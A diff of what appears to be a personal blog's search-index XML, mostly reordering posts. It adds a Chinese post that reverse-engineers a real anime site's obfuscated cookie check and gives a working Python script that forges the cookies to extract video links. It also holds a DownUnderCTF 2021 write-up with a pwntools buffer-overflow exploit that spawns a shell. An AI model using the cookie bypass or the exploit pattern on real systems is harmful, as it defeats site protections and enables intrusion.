@@ -96,30 +96,6 @@ RewriteRule (.*) https://%{HTTP_HOST}/$1 [R=301,L]
       </categories>
   </entry>
   <entry>
-    <title>在automator里使用python3</title>
-    <url>/2018/12/31/2018-12-31-22-23-25/</url>
-    <content><![CDATA[<p>在automator里使用python3<br><br>使用/bin/bash,然后看下面代码。</p>
-<pre>
-export PATH+=:/usr/local/bin:/usr/bin:/bin
-/usr/local/bin/python3 << "EOF" - "$@"
-      //python codes
-EOF
-</pre>
-<br>
-e.g. 实现FFmpeg提取音频。
-<pre>
-export PATH+=:/usr/local/bin:/usr/bin:/bin
-/usr/local/bin/python3 << "EOF" - "$@"
-import sys,os
-import subprocess
-
-<p>files = []<br>for f in sys.argv[1:]:<br>    files.append(f)<br>for file in files:<br>    videoPath = file<br>    audioPath = os.path.splitext(file)[0]+”.m4a”<br>    status = subprocess.call([“ffmpeg”, “-y”, “-i”, videoPath, “-acodec”, “copy”, “-vn”, audioPath], shell=False)<br>    if status == 0:<br>        pass<br>    else:<br>        pass<br>EOF<br></pre></p>
-]]></content>
-      <categories>
-        <category>Programming</category>
-      </categories>
-  </entry>
-  <entry>
     <title>检测浏览器切换页面</title>
     <url>/2019/01/04/2019-01-04-21-35-30/</url>
     <content><![CDATA[<p>本页面以加载以下代码，切换标签页看看吧.</p>
@@ -150,6 +126,30 @@ document.addEventListener('visibilitychange',function(){
     }
 });
 </script>]]></content>
+      <categories>
+        <category>Programming</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>在automator里使用python3</title>
+    <url>/2018/12/31/2018-12-31-22-23-25/</url>
+    <content><![CDATA[<p>在automator里使用python3<br><br>使用/bin/bash,然后看下面代码。</p>
+<pre>
+export PATH+=:/usr/local/bin:/usr/bin:/bin
+/usr/local/bin/python3 << "EOF" - "$@"
+      //python codes
+EOF
+</pre>
+<br>
+e.g. 实现FFmpeg提取音频。
+<pre>
+export PATH+=:/usr/local/bin:/usr/bin:/bin
+/usr/local/bin/python3 << "EOF" - "$@"
+import sys,os
+import subprocess
+
+<p>files = []<br>for f in sys.argv[1:]:<br>    files.append(f)<br>for file in files:<br>    videoPath = file<br>    audioPath = os.path.splitext(file)[0]+”.m4a”<br>    status = subprocess.call([“ffmpeg”, “-y”, “-i”, videoPath, “-acodec”, “copy”, “-vn”, audioPath], shell=False)<br>    if status == 0:<br>        pass<br>    else:<br>        pass<br>EOF<br></pre></p>
+]]></content>
       <categories>
         <category>Programming</category>
       </categories>
@@ -287,6 +287,21 @@ def generateFilehash(filepath, blocksize=2 ** 16):
       </tags>
   </entry>
   <entry>
+    <title>Fininshing Update Shazam analysis(chinese version)</title>
+    <url>/2019/02/09/2019-02-09-20-46-15/</url>
+    <content><![CDATA[<p>See </p>
+<p><a href="https://www.lxgshadow.us/blog/article-detail/13">First section</a><br>-<a href="https://www.bilibili.com/read/cv1904784">Bilibili</a></p>
+<p><a href="https://www.lxgshadow.us/blog/article-detail/14">Second section</a>-<a href="https://www.bilibili.com/read/cv1965924">Bilibili</a></p>
+<p><a href="https://www.lxgshadow.us/blog/article-detail/15">Third section</a>-<a href="https://www.bilibili.com/read/cv2016569">Bilibili</a></p>
+]]></content>
+      <categories>
+        <category>Programming</category>
+      </categories>
+      <tags>
+        <tag>shazam</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Shazam听歌识曲算法解析+python实现-3 检索歌曲</title>
     <url>/2019/02/09/2019-02-09-20-39-15/</url>
     <content><![CDATA[<p>第三部份<br>在开始之前，我们首先要认真阅读一下论文《An Industrial-Strength Audio Search Algorithm》。 </p>
@@ -330,21 +345,6 @@ def generateFilehash(filepath, blocksize=2 ** 16):
 <p><img src="https://i.loli.net/2019/02/09/5c5ec838f1c1a.jpg" alt="处理"></p>
 <p>结束。</p>
 <p>转载请先获得许可</p>
-]]></content>
-      <categories>
-        <category>Programming</category>
-      </categories>
-      <tags>
-        <tag>shazam</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Fininshing Update Shazam analysis(chinese version)</title>
-    <url>/2019/02/09/2019-02-09-20-46-15/</url>
-    <content><![CDATA[<p>See </p>
-<p><a href="https://www.lxgshadow.us/blog/article-detail/13">First section</a><br>-<a href="https://www.bilibili.com/read/cv1904784">Bilibili</a></p>
-<p><a href="https://www.lxgshadow.us/blog/article-detail/14">Second section</a>-<a href="https://www.bilibili.com/read/cv1965924">Bilibili</a></p>
-<p><a href="https://www.lxgshadow.us/blog/article-detail/15">Third section</a>-<a href="https://www.bilibili.com/read/cv2016569">Bilibili</a></p>
 ]]></content>
       <categories>
         <category>Programming</category>
@@ -865,18 +865,6 @@ tag = urllib.parse.unquote(url)
       </tags>
   </entry>
   <entry>
-    <title>New Best Toefl Score 2019 Aug</title>
-    <url>/2019/09/04/2019-09-04-08-30-23/</url>
-    <content><![CDATA[<p><img src="https://i.loli.net/2019/09/05/MZ9cxheQ3jJ5PEG.png" alt="4087FDA874E59871EAACAEC74B194535.png"></p>
-]]></content>
-      <categories>
-        <category>Life</category>
-      </categories>
-      <tags>
-        <tag>toefl</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>How to change ssh port or add ssh port</title>
     <url>/2019/09/04/2019-09-04-14-19-40/</url>
     <content><![CDATA[<h3 id="Adding-ports"><a href="#Adding-ports" class="headerlink" title="Adding ports"></a>Adding ports</h3><ol>
@@ -995,6 +983,18 @@ server {
       <categories>
         <category>SiteDev</category>
       </categories>
+  </entry>
+  <entry>
+    <title>New Best Toefl Score 2019 Aug</title>
+    <url>/2019/09/04/2019-09-04-08-30-23/</url>
+    <content><![CDATA[<p><img src="https://i.loli.net/2019/09/05/MZ9cxheQ3jJ5PEG.png" alt="4087FDA874E59871EAACAEC74B194535.png"></p>
+]]></content>
+      <categories>
+        <category>Life</category>
+      </categories>
+      <tags>
+        <tag>toefl</tag>
+      </tags>
   </entry>
   <entry>
     <title>Python input function not work properly in linux</title>
@@ -1387,6 +1387,92 @@ https://www.bsfdvbsbilibili.com
       </tags>
   </entry>
   <entry>
+    <title>agefans视频解析逆向</title>
+    <url>/2021/10/14/agefans-shi-pin-jie-xi-ni-xiang/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在做爬虫项目，发现一个动漫网站挺好，可以这个视频解析似乎有加密，最近正好有空，看了一下这个解密是怎么做出来的</p>
+<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>介绍一下今天的对象 <a href="https://www.agefans.cc/">agefans</a>。</p>
+<p>那么首先开F12看看http有哪些请求。 然后这网站甚至还开了清console和不停debug来阻止我们使用开发者工具。</p>
+<p><img src="/2021/10/14/agefans-shi-pin-jie-xi-ni-xiang/2021-10-14_084109.jpg" alt="2021-10-14_084109.jpg"><br><img src="/2021/10/14/agefans-shi-pin-jie-xi-ni-xiang/2021-10-14_084120.jpg" alt="2021-10-14_084120.jpg"></p>
+<p>但是没有关系，把breakpoint关掉就行了。</p>
+<p><img src="/2021/10/14/agefans-shi-pin-jie-xi-ni-xiang/2021-10-14_084200.png" alt="2021-10-14_084200.png"></p>
+<h1 id="简单的分析"><a href="#简单的分析" class="headerlink" title="简单的分析"></a>简单的分析</h1><p>先搜索一下视频文件在哪里出现了，</p>
+<p>可以发现视频地址是在 _getplay2 这个api中得到的，</p>
+<p>进一步分析可以得到_getplayer2是通过_getplay 302 跳转的。</p>
+<span id="more"></span>
+<p><img src="/2021/10/14/agefans-shi-pin-jie-xi-ni-xiang/2021-10-12_143227.jpg" alt="2021-10-12_143227.jpg"></p>
+<p>比如, <a href="https://www.agefans.cc/_getplay?aid=20210249&amp;playindex=2&amp;epindex=1">https://www.agefans.cc/_getplay?aid=20210249&amp;playindex=2&amp;epindex=1</a>, 会302跳转到 <a href="https://www.agefans.cc/_getplay2?kp=xxxxxxxxxxxxxx">https://www.agefans.cc/_getplay2?kp=xxxxxxxxxxxxxx</a> 最后获得视频地址。</p>
+<p>但是，直接访问 <a href="https://www.agefans.cc/_getplay?aid=20210249&amp;playindex=2&amp;epindex=1">https://www.agefans.cc/_getplay?aid=20210249&amp;playindex=2&amp;epindex=1</a> 无法得到302跳转，反而会返回 err:timeout. 所以猜测有一个鉴权。</p>
+<h1 id="仔细的分析"><a href="#仔细的分析" class="headerlink" title="仔细的分析"></a>仔细的分析</h1><p>搜索 _getplay?, 在 <code>s_playpre.js</code> 中发现了他的踪迹</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function __cb_getplay_url()&#123;</span><br><span class="line">    //</span><br><span class="line">    const _url = window.location.href;</span><br><span class="line">    const _rand = Math.random();</span><br><span class="line">    var _getplay_url = (_url.replace(/.*\/play\/(\d&#123;8&#125;)-(\d+?)-(\d+?)\.html.*/, &#x27;/_getplay?aid=$1&amp;playindex=$2&amp;epindex=$3&#x27;) + &#x27;&amp;r=&#x27; + _rand);</span><br><span class="line">    //</span><br><span class="line">    var re_resl = _getplay_url.match(/[&amp;?]+epindex=(\d+)/);</span><br><span class="line">    const hf_epi = (&#x27;&#x27; + FEI2(re_resl[1]));</span><br><span class="line">    const t_epindex_ = &#x27;epindex=&#x27;;</span><br><span class="line">    _getplay_url = _getplay_url.replace(t_epindex_ + re_resl[1], t_epindex_ + hf_epi);</span><br><span class="line">    return _getplay_url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续看哪些地方调用了<code>__cb_getplay_url</code>, </p>
+<p>找到发送请求的地方, </p>
+<p>简单分析一下这个用来处理权限问题的函数应该为<code>getplay_pck()</code> 以及 <code>getplay_pck2()</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function __getset_play(_in_id, cb_getplay_url, cb_cnt)&#123;</span><br><span class="line">    //</span><br><span class="line">    const _url = window.location.href;</span><br><span class="line">    const _rand = Math.random();</span><br><span class="line">    const _getplay_url = cb_getplay_url();</span><br><span class="line">    if(dettchk())&#123;</span><br><span class="line">      $.get(_getplay_url, function(_in_data, _in_status)&#123;</span><br><span class="line">          if(&#x27;err:timeout&#x27; == _in_data)&#123;</span><br><span class="line">            if(cb_cnt &gt; 0)&#123;</span><br><span class="line">              __getplay_pck();</span><br><span class="line">              __getplay_pck2();</span><br><span class="line">              return __getset_play(_in_id, cb_getplay_url, cb_cnt-1);</span><br><span class="line">            &#125;else &#123;</span><br><span class="line">              return false;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          // ignored</span><br></pre></td></tr></table></figure>
+
+<p>同理，搜索<code>getplay_pck()</code> 以及 <code>getplay_pck2()</code>, 发现他们分别出现在 <code>s_runtimelib.js</code> 和 <code>s_dett.js</code>中</p>
+<p>但是这两个是加密的, 我们得对他们进行一波解密。</p>
+<h1 id="特殊的分析"><a href="#特殊的分析" class="headerlink" title="特殊的分析"></a>特殊的分析</h1><p>在进行解密之前，我们先大概看一下服务器是如何鉴定正常的请求</p>
+<p>如下是一个请求</p>
+<p>在经过几次试验后，可以发现:</p>
+<ul>
+<li>这个请求可以正常获取到数据一定时间，过了一定时间后就会失效并且返回err:timeout.</li>
+<li>除了referer之外, 要获取到正常数据，还需要cookie，可能是是<strong>t1,k2,k2,t2</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /_getplay?aid=20210249&amp;playindex=2&amp;epindex=1&amp;r=0.7315117942661356 HTTP/1.1</span><br><span class="line">Host: www.agefans.cc</span><br><span class="line">Connection: close</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;94&quot;, &quot;Google Chrome&quot;;v=&quot;94&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot;</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://www.agefans.cc/play/20210249?playid=2_1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ck_volume=0.18; fa_c=1; Hm_lvt_7fdef555dc32f7d31fadd14999021b7b=1634075310,1634227432; Hm_lpvt_7fdef555dc32f7d31fadd14999021b7b=1634227432; t1=1634227492738; k1=372490656; k2=71052386557371; t2=1634227447871; fa_t=1634227447913</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>同时，失败的请求会返回 set-cookie, 如下</p>
+<p>set-cookie设置了t1以及k1, </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 14 Oct 2021 16:07:43 GMT</span><br><span class="line">Content-Type: text/plain; charset=utf-8</span><br><span class="line">Content-Length: 11</span><br><span class="line">Connection: close</span><br><span class="line">Set-Cookie: t1=1634227713016; Path=/</span><br><span class="line">Set-Cookie: k1=382912592; Path=/</span><br><span class="line">X-XSS-Protection: 1; mode=block</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">Access-Control-Allow-Origin: https://web.age-spa.com:8443</span><br><span class="line">Access-Control-Allow-Methods: GET, POST, OPTIONS</span><br><span class="line">Access-Control-Allow-Headers: DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Cache-Control: no-store</span><br><span class="line">Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</span><br><span class="line">CF-Cache-Status: DYNAMIC</span><br><span class="line">Expect-CT: max-age=604800, report-uri=&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;</span><br><span class="line">Server: cloudflare</span><br><span class="line">CF-RAY: 69e20ff0ae286040-SEA</span><br><span class="line"></span><br><span class="line">err:timeout</span><br></pre></td></tr></table></figure>
+
+<p><strong>所以，综合分析可以得知，首先我们需要获取<em>t1, k2</em>. 然后通过一定的算法，生成<em>t2,k2</em>并保存在cookie中，再次发送请求就可以获得数据了</strong></p>
+<h1 id="加密的分析"><a href="#加密的分析" class="headerlink" title="加密的分析"></a>加密的分析</h1><p>先来看一下这两文件长什么样</p>
+<p><img src="/2021/10/14/agefans-shi-pin-jie-xi-ni-xiang/2021-10-14_091306.jpg" alt="2021-10-14_091306.jpg"></p>
+<p>简单分析后得知, 加密后的代码大概分为三个部分</p>
+<ul>
+<li>数据段，包括对数据进行进一步处理</li>
+<li>解密函数</li>
+<li>加密代码段</li>
+</ul>
+<p>那么要解密也很简单了，只要把加密的地方，例如_0x1705(“xx”,”bbb”)通过解密函数解密即可。</p>
+<p>当然函数名是是还原不了了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function __getplay_pck2() &#123;</span><br><span class="line">;var encode_version = &#x27;加密类型版本&#x27;</span><br><span class="line">      , fwiba = &#x27;__0x9ecf8&#x27;</span><br><span class="line">      , __0x9ecf8 = [&#x27;数据&#x27;];</span><br><span class="line">     // 处理数据 </span><br><span class="line">    (function(_0x25c7a5, _0x422073) &#123;</span><br><span class="line">        var _0x25cb8a = function(_0x355576) &#123;</span><br><span class="line">            while (--_0x355576) &#123;</span><br><span class="line">                _0x25c7a5[&#x27;push&#x27;](_0x25c7a5[&#x27;shift&#x27;]());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        _0x25cb8a(++_0x422073);</span><br><span class="line">    &#125;(__0x9ecf8, 0x1db));</span><br><span class="line">    // 解密函数</span><br><span class="line">    var _0x1705 = function(_0x501411, _0x17d72d) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 加密后的原始代码</span><br><span class="line">    xxx[_0x1705(xxx,xxx)] = xxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>知道了解密方法之后我们来看一下用来做验证的两个函数到底干了什么</p>
+<h2 id="getplay-pck"><a href="#getplay-pck" class="headerlink" title="getplay_pck()"></a>getplay_pck()</h2><p>首先是犯下首先之罪的 <code>__getplay_pck()</code>,</p>
+<p>猜测一下<code>f</code>大概就是获得cookie的值，然后<code>f2</code>大概就是设置cookie的值。</p>
+<p>如下图分析，这段算法首先获取了t1的值，然后把t1除 0x3e8 (1000) 四舍五入取整，最后右移5位</p>
+<p>k2可通过一段不明意义的计算获取</p>
+<p>t2为当前时间</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// get cookie t1 </span><br><span class="line">// t1 = Math.round(Number(f(&#x27;t1&#x27;)) / 0x3e8) &gt;&gt; 0x5;</span><br><span class="line">t1 = Math[&#x27;round&#x27;](Number(f(&#x27;t1&#x27;)) / 0x3e8) &gt;&gt; 0x5;</span><br><span class="line"></span><br><span class="line">// set cookie k2</span><br><span class="line">// k2 = (t1 * (t1 % 0x1000) * 0x3 + 0x1450f) * (t1 % 0x1000) + t1</span><br><span class="line">f2(&#x27;k2&#x27;, (t1 * (t1 % 0x1000) * 0x3 + 0x1450f) * (t1 % 0x1000) + t1);</span><br><span class="line"></span><br><span class="line">// set cookie t2</span><br><span class="line">// k2 =  new Date().getTime()+&quot;&quot;</span><br><span class="line">f2(&#x27;t2&#x27;, new Date()[_0x1705(&#x27;0x12&#x27;, &#x27;bPNz&#x27;)]());</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="getplay-pck2"><a href="#getplay-pck2" class="headerlink" title="getplay_pck2()"></a>getplay_pck2()</h2><p>然后是是犯下然后之罪的 <code>__getplay_pck2()</code></p>
+<p>通过分析得知，首先获取k2的最后一个数字，然后获取一个t2，使这个t2的最后三个数字包含k2的最后一个数字</p>
+<p>结束</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ksub = k2[-1]</span><br><span class="line">ksub = f(&#x27;k2&#x27;)[&#x27;slice&#x27;](-0x1);</span><br><span class="line">// while true</span><br><span class="line">while (!![]) &#123;</span><br><span class="line">	// t2 =  new Date().getTime()</span><br><span class="line">    t2 = new Date()[&#x27;getTime&#x27;]();</span><br><span class="line">    // if t2.toString().slice(-0x3).indexOf(ksub) &gt;= 0</span><br><span class="line">    if (t2[&#x27;toString&#x27;]()[&#x27;slice&#x27;](-0x3)[_0x1691(&#x27;0x12&#x27;, &#x27;9f@X&#x27;)](ksub) &gt;= 0x0) &#123;</span><br><span class="line">    	// set cookie t2 = t2</span><br><span class="line">        f2(&#x27;t2&#x27;, t2);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="“keygen”"><a href="#“keygen”" class="headerlink" title="“keygen”"></a>“keygen”</h1><p>那么知道了是如何完成验证的，那么就可以开始写解析了，先来整理一下步骤</p>
+<p><em>其实k1没什么用</em></p>
+<ol>
+<li>访问_getplay，获得t1</li>
+<li>通过以上方式获得cookie</li>
+<li>加上cookie再次访问获得链接</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcookie</span>(<span class="params">t1:<span class="built_in">int</span></span>):</span></span><br><span class="line">    time_now = <span class="built_in">int</span>(time.time()*<span class="number">1000</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;t1 is %d, now is %s, t1-time_now = %d&quot;</span>%(t1,time_now,t1-time_now))</span><br><span class="line">    t1_tmp = math.floor(t1 / <span class="number">1000</span> + <span class="number">0.5</span>) &gt;&gt; <span class="number">0x5</span></span><br><span class="line">    k2 = (t1_tmp * (t1_tmp % <span class="number">0x1000</span>) * <span class="number">0x3</span> + <span class="number">0x1450f</span>) * (t1_tmp % <span class="number">0x1000</span>) + t1_tmp</span><br><span class="line">    t2 = time_now</span><br><span class="line">    k2_s = <span class="built_in">str</span>(k2)</span><br><span class="line">    t2_s = <span class="built_in">str</span>(t2)</span><br><span class="line">    t2_s = t2_s[:-<span class="number">1</span>:]+k2_s[-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;k2=%s&quot;</span> % k2_s)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;t2=%s&quot;</span> % t2_s)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;t2&quot;</span>:t2_s,<span class="string">&quot;k2&quot;</span>:k2_s&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.agefans.cc/_getplay?aid=20210249&amp;playindex=2&amp;epindex=1&quot;</span></span><br><span class="line">data = requests.head(url,headers=&#123;<span class="string">&quot;referer&quot;</span>:<span class="string">&quot;https://www.agefans.cc/&quot;</span>,&#125;)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">setcookies = data.headers.get(<span class="string">&quot;set-cookie&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(setcookies)</span><br><span class="line">t1 = <span class="built_in">int</span>(re.<span class="built_in">compile</span>(<span class="string">r&quot;t1=[^;]*;&quot;</span>).search(setcookies).group()[<span class="number">3</span>:-<span class="number">1</span>:])</span><br><span class="line"><span class="built_in">print</span>(t1)</span><br><span class="line">cookies = getcookie(t1)</span><br><span class="line">cookies[<span class="string">&quot;t1&quot;</span>] = <span class="built_in">str</span>(t1)</span><br><span class="line">data = requests.get(url,headers=&#123;<span class="string">&quot;referer&quot;</span>:<span class="string">&quot;https://www.agefans.cc/&quot;</span>,&#125;,cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(data.text)</span><br></pre></td></tr></table></figure>
+
+<p>成功获得直链~</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Response [200]&gt;</span><br><span class="line">t1=1634231445902; Path=/, k1=586623324; Path=/</span><br><span class="line">1634231445902</span><br><span class="line">t1 is 1634231445902, now is 1634231395254, t1-time_now = 50648</span><br><span class="line">k2=99036993616128</span><br><span class="line">t2=1634231395258</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line">		&quot;purl&quot;:&quot;/age/player/ckx1/?url=&quot;,</span><br><span class="line">		&quot;purlf&quot;:&quot;https://play.agefans.cc:8443/age/player/dpx/?url=&quot;,</span><br><span class="line">		&quot;vurl&quot;:&quot;https%3a%2f%2fkol%2dfans%2efp%2eps%2enetease%2ecom%2ffile%2f6159a40954eace75cb975131raYEy7we03?from%3Dysjdm.com%7Cysjdm.net&quot;,</span><br><span class="line">		&quot;playid&quot;:&quot;&lt;play&gt;web_mp4&lt;/play&gt;&quot;,</span><br><span class="line">		&quot;vurl_bak&quot;:&quot;&quot;,</span><br><span class="line">		&quot;purl_mp4&quot;:&quot;/age/player/ckx1/?url=&quot;,</span><br><span class="line">		&quot;ex&quot;:&quot;&quot;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>整这么麻烦干什么。</p>
+]]></content>
+      <tags>
+        <tag>javascript</tag>
+        <tag>anime</tag>
+        <tag>reverse</tag>
+        <tag>encryption</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[writeup][DownUnderCTF 2021] pwn Leaking like a sieve</title>
     <url>/2021/10/09/ductf2021-pwn-leaking-like-a-sieve/</url>
     <content><![CDATA[<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
@@ -1531,8 +1617,7 @@ https://www.bsfdvbsbilibili.com
 
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">undefined8 main(void)</span><br><span class="line">&#123;</span><br><span class="line">    char *s;</span><br><span class="line">    uint64_t var_8h;</span><br><span class="line">    </span><br><span class="line">    var_8h = 0;</span><br><span class="line">    buffer_init();</span><br><span class="line">    puts(</span><br><span class="line">        &quot;\nI\&#x27;m developing this new application in C, I\&#x27;ve setup some code for the new features but it\&#x27;s not (a)live yet.&quot;</span><br><span class="line">        );</span><br><span class="line">    puts(&quot;\nWhat features would you like to see in my app?&quot;);</span><br><span class="line">    gets(&amp;s);</span><br><span class="line">    if (var_8h == 0xdeadc0de) &#123;</span><br><span class="line">        puts(&quot;\n\nMaybe this code isn\&#x27;t so dead...&quot;);</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=pwn-2021.duc.tf&#x27; &#x27;--port=31916&#x27; deadcode</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;deadcode&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;pwn-2021.duc.tf&#x27;</span><br><span class="line">port = int(args.PORT or 31916)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># shellcode = asm(shellcraft.sh())</span><br><span class="line"># payload = fit(&#123;</span><br><span class="line">#     32: 0xdeadbeef,</span><br><span class="line">#     &#x27;iaaa&#x27;: [1, 2, &#x27;Hello&#x27;, 3]</span><br><span class="line"># &#125;, length=128)</span><br><span class="line"># io.send(payload)</span><br><span class="line"># flag = io.recv(...)</span><br><span class="line"># log.success(flag)</span><br><span class="line">print(io.recv(1024))</span><br><span class="line">io.send(os.urandom(0x20-0x8)+(0xdeadc0de).to_bytes(0x8,&quot;little&quot;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Exploits"><a href="#Exploits" class="headerlink" title="Exploits"></a>Exploits</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=pwn-2021.duc.tf&#x27; &#x27;--port=31916&#x27; deadcode</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;deadcode&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;pwn-2021.duc.tf&#x27;</span><br><span class="line">port = int(args.PORT or 